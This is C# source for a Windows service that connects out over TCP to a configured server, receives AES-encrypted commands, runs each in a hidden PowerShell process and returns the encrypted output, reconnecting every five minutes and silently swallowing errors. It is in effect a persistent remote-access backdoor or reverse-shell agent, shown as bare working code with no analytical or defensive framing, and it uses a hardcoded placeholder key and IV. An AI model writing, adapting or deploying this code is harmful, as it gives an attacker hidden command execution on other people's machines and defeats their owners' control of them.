using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        private Thread _clientThread;
        private const string ServerAddress = "127.0.0.1";
        private const int ServerPort = 6080;
        private const int ReconnectDelay = 5 * 60 * 1000; // 5 min

        // 16 bytes
        private readonly byte[] _key = Encoding.UTF8.GetBytes("YourSecretKey123");
        private readonly byte[] _iv = Encoding.UTF8.GetBytes("YourInitVector12");

        protected override async void OnStart(string[] args)
        {
            Thread connection = new Thread(ConnectToServer);
            connection.Start();

            await Task.Delay(5000);
        }

        private void ConnectToServer()
        {
            while (true)
            {
                try
                {
                    using (var client = new TcpClient(ServerAddress, ServerPort))
                    {
                        var stream = client.GetStream();
                        while (client.Connected)
                        {
                            var buffer = new byte[2048];
                            var bytesRead = stream.Read(buffer, 0, buffer.Length);

                            var encryptedData = new byte[bytesRead];
                            Array.Copy(buffer, encryptedData, bytesRead);

                            var command = DecryptCommand(encryptedData);    

                            var response = ExecuteCommand(command);

                            var encryptedResponse = EncryptCommand(response);

                            var responseBytes = Encoding.GetEncoding(866).GetBytes(encryptedResponse);
                            stream.Write(responseBytes, 0, responseBytes.Length);
                        }
                    }
                }
                catch { }
                Thread.Sleep(ReconnectDelay);
            }
        }

      
        private string ExecuteCommand(string command)
        {
            try
            {
                var processInfo = new ProcessStartInfo("powershell.exe", "chcp 65001; " + command)
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8
                };

                var process = new Process { StartInfo = processInfo };
                process.Start();
                var output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                return output;
            }
            catch (Exception ex)
            {
                return $"Error executing command: {ex.Message}";
            }
        }

        private string EncryptCommand(string command)
        {
            byte[] plainData = Encoding.UTF8.GetBytes(command);
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = _key;
                aesAlg.IV = _iv;

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesAlg.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(plainData, 0, plainData.Length);
                        cryptoStream.FlushFinalBlock();
                        byte[] encryptedData = memoryStream.ToArray();
                        return Convert.ToBase64String(encryptedData);
                    }
                }
            }
        }

        private string DecryptCommand(byte[] encryptedData)
        {
            byte[] cipherData = Convert.FromBase64String(Encoding.UTF8.GetString(encryptedData));
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = _key;
                aesAlg.IV = _iv;

                using (MemoryStream memoryStream = new MemoryStream(cipherData))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesAlg.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        byte[] decryptedData = new byte[cipherData.Length];
                        int decryptedDataLength = cryptoStream.Read(decryptedData, 0, decryptedData.Length);
                        return Encoding.UTF8.GetString(decryptedData, 0, decryptedDataLength);
                    }
                }
            }
        }

        protected override void OnStop()
        {
        }
    }
}